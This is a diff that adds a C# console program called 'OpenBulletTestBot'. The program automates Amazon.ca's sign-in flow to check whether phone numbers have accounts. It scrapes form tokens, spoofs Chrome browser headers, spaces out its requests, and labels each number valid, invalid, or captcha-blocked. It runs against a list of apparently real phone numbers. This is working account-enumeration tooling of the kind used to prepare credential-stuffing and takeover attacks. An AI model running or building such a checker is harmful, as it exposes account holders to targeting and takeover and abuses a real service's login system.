@@ -1,0 +1,279 @@
+using System;
+using System.IO;
+using System.Text;
+using System.Text.RegularExpressions;
+using System.Threading;
+using System.Collections.Generic;
+using System.Linq;
+
+// Using Leaf.xNet from DLL
+using Leaf.xNet;
+using HttpStatusCode = Leaf.xNet.HttpStatusCode;
+
+namespace OpenBulletTestBot
+{
+    class WorkingTestBot
+    {
+        private static readonly string USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36";
+        private static string resultsDir;
+        private static string logFile;
+        
+        static void Main(string[] args)
+        {
+            Console.WriteLine(@"
+================================================
+WORKING OPENBULLET TEST BOT
+Using actual Amazon signin flow
+================================================");
+
+            // Initialize
+            resultsDir = Path.Combine(Directory.GetCurrentDirectory(), $"TestResults_Working_{DateTime.Now:yyyyMMdd_HHmmss}");
+            Directory.CreateDirectory(resultsDir);
+            Directory.CreateDirectory(Path.Combine(resultsDir, "HTML_Responses"));
+            logFile = Path.Combine(resultsDir, "test.log");
+            
+            // Test numbers
+            var testNumbers = new[] { "15142955315", "15145692379", "15149772071", "11111111111", "99999999999" };
+            
+            Console.WriteLine($"[INFO] Testing {testNumbers.Length} numbers\n");
+            Log("=== TEST STARTED ===");
+            
+            // Test with the working URL pattern we know works
+            var workingUrl = "https://www.amazon.ca/ap/signin?openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.ca%2F%3Fref_%3Dnav_ya_signin&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.assoc_handle=caflex&openid.mode=checkid_setup&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0";
+            
+            foreach (var number in testNumbers)
+            {
+                Console.WriteLine($"\n{new string('=', 50)}");
+                Console.WriteLine($"Testing: {number}");
+                TestNumberDirect(number, workingUrl);
+                Thread.Sleep(3000); // Rate limiting
+            }
+            
+            Console.WriteLine($"\n\nResults saved to: {resultsDir}");
+            Console.WriteLine("\n[DONE] Test complete");
+        }
+        
+        private static void TestNumberDirect(string phoneNumber, string signinUrl)
+        {
+            try
+            {
+                using (var request = new HttpRequest())
+                {
+                    // Configure request with all necessary headers
+                    request.UserAgent = USER_AGENT;
+                    request.KeepAlive = true;
+                    request.AllowAutoRedirect = false; // Handle redirects manually
+                    request.ConnectTimeout = 15000;
+                    request.ReadWriteTimeout = 15000;
+                    
+                    // Set headers to mimic real browser
+                    request.AddHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8");
+                    request.AddHeader("Accept-Language", "en-US,en;q=0.9");
+                    request.AddHeader("Accept-Encoding", "gzip, deflate, br");
+                    request.AddHeader("Sec-Ch-Ua", "\"Not_A Brand\";v=\"8\", \"Chromium\";v=\"120\", \"Google Chrome\";v=\"120\"");
+                    request.AddHeader("Sec-Ch-Ua-Mobile", "?0");
+                    request.AddHeader("Sec-Ch-Ua-Platform", "\"Windows\"");
+                    request.AddHeader("Sec-Fetch-Dest", "document");
+                    request.AddHeader("Sec-Fetch-Mode", "navigate");
+                    request.AddHeader("Sec-Fetch-Site", "none");
+                    request.AddHeader("Sec-Fetch-User", "?1");
+                    request.AddHeader("Upgrade-Insecure-Requests", "1");
+                    
+                    // Step 1: Get signin page
+                    Console.WriteLine("  Step 1: Getting signin page...");
+                    Log($"[{phoneNumber}] Getting signin page");
+                    
+                    var response = request.Get(signinUrl);
+                    
+                    // Handle redirect if needed
+                    while (response.StatusCode == HttpStatusCode.Redirect || 
+                           response.StatusCode == HttpStatusCode.MovedPermanently ||
+                           response.StatusCode == HttpStatusCode.Found)
+                    {
+                        var location = response.Location;
+                        if (string.IsNullOrEmpty(location)) break;
+                        
+                        Log($"[{phoneNumber}] Following redirect to: {location}");
+                        response = request.Get(location.StartsWith("http") ? location : "https://www.amazon.ca" + location);
+                    }
+                    
+                    var html = response.ToString();
+                    Log($"[{phoneNumber}] Response status: {response.StatusCode}");
+                    Log($"[{phoneNumber}] Response length: {html.Length} chars");
+                    
+                    // Save initial page
+                    var htmlFile1 = Path.Combine(resultsDir, "HTML_Responses", $"{phoneNumber}_step1.html");
+                    File.WriteAllText(htmlFile1, html);
+                    
+                    // Extract form action URL - THIS IS CRITICAL!
+                    var formAction = ExtractValue(html, "<form name=\"signIn\"", ">");
+                    var actionUrl = ExtractValue(formAction, "action=\"", "\"");
+                    
+                    // Extract form data
+                    var appActionToken = ExtractValue(html, "name=\"appActionToken\" value=\"", "\"");
+                    var appAction = ExtractValue(html, "name=\"appAction\" value=\"", "\"");
+                    var prevRID = ExtractValue(html, "name=\"prevRID\" value=\"", "\"");
+                    var workflowState = ExtractValue(html, "name=\"workflowState\" value=\"", "\"");
+                    var openidReturnTo = ExtractValue(html, "name=\"openid.return_to\" value=\"", "\"");
+                    
+                    if (string.IsNullOrEmpty(appActionToken))
+                    {
+                        // Try alternate extraction
+                        appActionToken = ExtractValue(html, "appActionToken\" value=\"", "\"");
+                    }
+                    
+                    Log($"[{phoneNumber}] Found tokens: {!string.IsNullOrEmpty(appActionToken)}");
+                    
+                    if (string.IsNullOrEmpty(appActionToken))
+                    {
+                        Console.WriteLine("  WARNING: No tokens found, trying direct submit");
+                        Log($"[{phoneNumber}] WARNING: No tokens found");
+                    }
+                    
+                    // Step 2: Submit phone number
+                    Console.WriteLine("  Step 2: Submitting phone number...");
+                    Log($"[{phoneNumber}] Submitting phone number");
+                    
+                    // Build minimal form data
+                    var postData = $"email={phoneNumber}&password=&create=0";
+                    
+                    if (!string.IsNullOrEmpty(appActionToken))
+                    {
+                        postData = $"appActionToken={Uri.EscapeDataString(appActionToken)}&" +
+                                  $"appAction={Uri.EscapeDataString(appAction ?? "SIGNIN_PWD_COLLECT")}&" +
+                                  $"email={phoneNumber}&password=&create=0";
+                    }
+                    
+                    // Set content type and referer
+                    request.AddHeader("Content-Type", "application/x-www-form-urlencoded");
+                    request.Referer = signinUrl;
+                    request.AddHeader("Origin", "https://www.amazon.ca");
+                    
+                    // Submit to the correct action URL from the form
+                    var submitUrl = string.IsNullOrEmpty(actionUrl) ? "https://www.amazon.ca/ap/signin" : 
+                                   (actionUrl.StartsWith("http") ? actionUrl : "https://www.amazon.ca" + actionUrl);
+                    
+                    Log($"[{phoneNumber}] Submitting to: {submitUrl}");
+                    var submitResponse = request.Post(submitUrl, postData, "application/x-www-form-urlencoded");
+                    
+                    // Handle redirect
+                    while (submitResponse.StatusCode == HttpStatusCode.Redirect || 
+                           submitResponse.StatusCode == HttpStatusCode.MovedPermanently ||
+                           submitResponse.StatusCode == HttpStatusCode.Found)
+                    {
+                        var location = submitResponse.Location;
+                        if (string.IsNullOrEmpty(location)) break;
+                        
+                        Log($"[{phoneNumber}] POST redirect to: {location}");
+                        submitResponse = request.Get(location.StartsWith("http") ? location : "https://www.amazon.ca" + location);
+                    }
+                    
+                    var responseHtml = submitResponse.ToString();
+                    Log($"[{phoneNumber}] Submit response status: {submitResponse.StatusCode}");
+                    Log($"[{phoneNumber}] Submit response length: {responseHtml.Length} chars");
+                    
+                    // Save response
+                    var htmlFile2 = Path.Combine(resultsDir, "HTML_Responses", $"{phoneNumber}_step2_response.html");
+                    File.WriteAllText(htmlFile2, responseHtml);
+                    
+                    // Analyze
+                    AnalyzeResponse(phoneNumber, responseHtml);
+                }
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine($"  ERROR: {ex.Message}");
+                Log($"[{phoneNumber}] ERROR: {ex.Message}");
+                if (ex.StackTrace != null)
+                {
+                    Log($"[{phoneNumber}] Stack: {ex.StackTrace}");
+                }
+            }
+        }
+        
+        private static void AnalyzeResponse(string phoneNumber, string html)
+        {
+            Console.WriteLine("  Step 3: Analyzing response...");
+            
+            // Extract page title
+            var title = ExtractValue(html, "<title>", "</title>");
+            Log($"[{phoneNumber}] Page title: {title}");
+            
+            // Key indicators
+            var indicators = new Dictionary<string, bool>
+            {
+                ["Has visible password field"] = html.Contains("type=\"password\"") && !html.Contains("hide"),
+                ["Has 'Enter password' text"] = html.Contains("Enter your password"),
+                ["Has 'Forgot password' link"] = html.Contains("Forgot your password"),
+                ["Has error message"] = html.Contains("Wrong or invalid") || html.Contains("cannot find"),
+                ["Has continue button"] = html.Contains("id=\"continue\""),
+                ["Has captcha"] = html.Contains("captcha"),
+                ["Phone pre-filled"] = html.Contains($"value=\"{phoneNumber}\"")
+            };
+            
+            foreach (var indicator in indicators)
+            {
+                if (indicator.Value)
+                {
+                    Log($"[{phoneNumber}] ✓ {indicator.Key}");
+                }
+            }
+            
+            // Determine result
+            if (indicators["Has captcha"])
+            {
+                Console.WriteLine("  RESULT: ⚠ CAPTCHA DETECTED");
+                Log($"[{phoneNumber}] RESULT: CAPTCHA");
+            }
+            else if (indicators["Has visible password field"] || 
+                     (indicators["Has 'Enter password' text"] && indicators["Has 'Forgot password' link"]))
+            {
+                Console.WriteLine("  RESULT: ✓ VALID (Account exists)");
+                Log($"[{phoneNumber}] RESULT: VALID");
+            }
+            else if (indicators["Has error message"])
+            {
+                Console.WriteLine("  RESULT: ✗ INVALID (No account)");
+                Log($"[{phoneNumber}] RESULT: INVALID");
+            }
+            else if (indicators["Has continue button"] && indicators["Phone pre-filled"])
+            {
+                Console.WriteLine("  RESULT: ⚠ FORM NOT SUBMITTED PROPERLY");
+                Log($"[{phoneNumber}] RESULT: Form not submitted");
+                
+                // Log what we see for debugging
+                var formAction = ExtractValue(html, "<form", ">");
+                Log($"[{phoneNumber}] Form tag: {formAction}");
+            }
+            else
+            {
+                Console.WriteLine("  RESULT: ? UNKNOWN");
+                Log($"[{phoneNumber}] RESULT: UNKNOWN");
+            }
+        }
+        
+        private static string ExtractValue(string html, string start, string end)
+        {
+            try
+            {
+                int startIndex = html.IndexOf(start);
+                if (startIndex == -1) return "";
+                startIndex += start.Length;
+                int endIndex = html.IndexOf(end, startIndex);
+                if (endIndex == -1) return "";
+                var value = html.Substring(startIndex, endIndex - startIndex);
+                return value.Length > 200 ? value.Substring(0, 200) + "..." : value;
+            }
+            catch
+            {
+                return "";
+            }
+        }
+        
+        private static void Log(string message)
+        {
+            var logEntry = $"[{DateTime.Now:HH:mm:ss}] {message}";
+            File.AppendAllText(logFile, logEntry + Environment.NewLine);
+        }
+    }
+}
